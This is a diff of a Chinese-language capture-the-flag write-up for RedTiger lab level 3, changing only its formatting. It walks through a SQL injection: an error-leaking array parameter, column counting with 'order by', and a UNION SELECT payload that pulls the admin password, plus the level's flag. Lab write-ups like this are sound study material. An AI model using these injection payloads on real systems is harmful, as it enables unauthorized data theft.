@@ -14,21 +14,15 @@
 
 ## Level 3
 
-    > Target: Get the password of the user Admin.
-    > Hint: Try to get an error. Tablename: level3_users
+> Target: Get the password of the user Admin.
+> Hint: Try to get an error. Tablename: level3_users
 
 1.  构造错误: `level3.php?usr[]=MTI5MTY0MTczMTY5MTc0`
-
     > Show userdetails:
     > Warning: preg_match() expects parameter 2 to be string, array given in /var/www/hackit/urlcrypt.inc on line 21
-
-
 2.  [urlcrypt.inc](./level_3/urlcrypt.inc)
-
 3.  得到两个函数，encrypt和decrypt分别用来解密和加密
-
 4.  构造PHP语句，确定列数:
-
     ```php
     $url='http://redtiger.labs.overthewire.org/level3.php?usr=';
     $order='admin\'order by 7 #';
@@ -39,16 +33,13 @@
     $order=encrypt($order);
     echo "$url$order <br>";
     ```
-
 5.  构造PHP语句，拿到flag:
-
     ```php
     $url='http://redtiger.labs.overthewire.org/level3.php?usr=';
     $order='\' union select 1,username,3,password,5,6,7 from level3_users where username=\'admin\' #';
     $order=encrypt($order);
     echo "$url$order <br>";
     ```
-
 6.  flag: a707b245a60d570d25a0449c2a516eca
 
 ## Level 4
